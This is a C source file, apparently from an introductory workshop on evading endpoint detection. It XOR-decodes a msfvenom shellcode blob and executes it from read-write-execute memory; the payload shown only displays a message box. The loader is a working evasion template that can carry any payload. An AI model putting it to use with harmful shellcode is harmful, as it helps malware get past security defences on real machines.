#include <Windows.h>
#include <stdio.h>

/* Generated using command 
"msfvenom -p windows/x64/messagebox ICON=INFORMATION TEXT="Cybershield 2025!" TITLE="Intro to EDR Evasion" --format c" */

SIZE_T payload_size = 332;
PBYTE payload = "\xb9\x0d\xc4\xa1\xb5\xba\xba\xba\xad\x95\x45\x45\x45\x04"
				"\x14\x04\x15\x17\x14\x13\x0d\x74\x97\x20\x0d\xce\x17\x25"
				"\x7b\x0d\xce\x17\x5d\x7b\x0d\xce\x17\x65\x7b\x0d\xce\x37"
				"\x15\x7b\x0d\x4a\xf2\x0f\x0f\x08\x74\x8c\x0d\x74\x85\xe9"
				"\x79\x24\x39\x47\x69\x65\x04\x84\x8c\x48\x04\x44\x84\xa7"
				"\xa8\x17\x04\x14\x7b\x0d\xce\x17\x65\x7b\xce\x07\x79\x0d"
				"\x44\x95\x7b\xce\xc5\xcd\x45\x45\x45\x0d\xc0\x85\x31\x2a"
				"\x0d\x44\x95\x15\x7b\xce\x0d\x5d\x7b\x01\xce\x05\x65\x0c"
				"\x44\x95\xa6\x19\x0d\xba\x8c\x7b\x04\xce\x71\xcd\x0d\x44"
				"\x93\x08\x74\x8c\x0d\x74\x85\xe9\x04\x84\x8c\x48\x04\x44"
				"\x84\x7d\xa5\x30\xb4\x7b\x09\x46\x09\x61\x4d\x00\x7c\x94"
				"\x30\x93\x1d\x7b\x01\xce\x05\x61\x0c\x44\x95\x23\x7b\x04"
				"\xce\x49\x0d\x7b\x01\xce\x05\x59\x0c\x44\x95\x7b\x04\xce"
				"\x41\xcd\x0d\x44\x95\x04\x1d\x04\x1d\x1b\x1c\x1f\x04\x1d"
				"\x04\x1c\x04\x1f\x0d\xc6\xa9\x65\x04\x17\xba\xa5\x1d\x04"
				"\x1c\x1f\x7b\x0d\xce\x57\xac\x0c\xba\xba\xba\x18\x7b\x0d"
				"\xc8\xc8\x71\x44\x45\x45\x04\xff\x09\x32\x63\x42\xba\x90"
				"\x0c\x82\x84\x05\x45\x45\x45\x7b\x0d\xc8\xd0\x4b\x44\x45"
				"\x45\x7b\x09\xc8\xc0\x5a\x44\x45\x45\x0d\x74\x8c\x04\xff"
				"\x00\xc6\x13\x42\xba\x90\x0d\x74\x8c\x04\xff\xb5\xf0\xe7"
				"\x13\xba\x90\x06\x3c\x27\x20\x37\x36\x2d\x2c\x20\x29\x21"
				"\x65\x77\x75\x77\x70\x45\x0c\x2b\x31\x37\x2a\x65\x31\x2a"
				"\x65\x00\x01\x17\x65\x00\x33\x24\x36\x2c\x2a\x2b\x45\x30"
				"\x36\x20\x37\x76\x77\x6b\x21\x29\x29\x45";


PBYTE xor_payload(PBYTE payload, SIZE_T payload_size, BYTE key) {
	for (SIZE_T i = 0; i < payload_size; i++) {
		payload[i] ^= key;
	}

	return payload;
}

int main(void) {

	PBYTE executable_memory = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (executable_memory == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return -1;
	}

	memcpy(executable_memory, payload, payload_size);

	xor_payload(executable_memory, payload_size, 0x45);

	(*(VOID(*)()) executable_memory)();

	getchar();
}